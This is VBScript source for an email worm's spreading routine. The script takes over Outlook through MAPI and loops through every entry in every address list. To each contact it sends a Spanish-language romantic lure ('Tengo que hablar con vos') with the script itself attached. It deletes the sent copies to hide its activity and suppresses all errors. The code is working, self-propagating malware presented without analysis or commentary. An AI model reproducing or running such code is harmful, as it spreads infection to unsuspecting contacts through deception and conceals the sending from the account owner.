   On Error Resume Next
   enviarmail()



   Function enviarmail()
    On Error Resume Next
    Set programa = CreateObject("Outlook.Application")
    Set rOwamTjngb5= Createobject("scripting.filesystemobject")
    If programa= "Outlook" Then
        Set variable=programa.GetNameSpace("MAPI")
        Set direcciones= variable.AddressLists
        For Each chabones In direcciones
        If chabones.AddressEntries.Count <> 0 Then
           cosa1 = chabones.AddressEntries.Count
           For cosa2= 1 To cosa1
               Set cosa3 = programa.CreateItem(0)
               Set direccion = chabones.AddressEntries(cosa2)
               cosa3.To = direccion.Address
               cosa3.Subject = "Tengo que hablar con vos"
               cosa3.Body = "Hola:" & vbcrlf & "Hace mucho que quiero decirte que estoy enamorado de vos. No es joda. Necesito que nos juntemos. Si no, mirá el attachment." & vbcrlf & ""
               set cosarara=cosa3.Attachments
               cosarara.Add wscript.scriptfullname
               cosa3.DeleteAfterSubmit = True
               If cosa3.To <> "" Then
                   cosa3.Send
               End If
           Next
       End If
       Next
   end if

   End Function
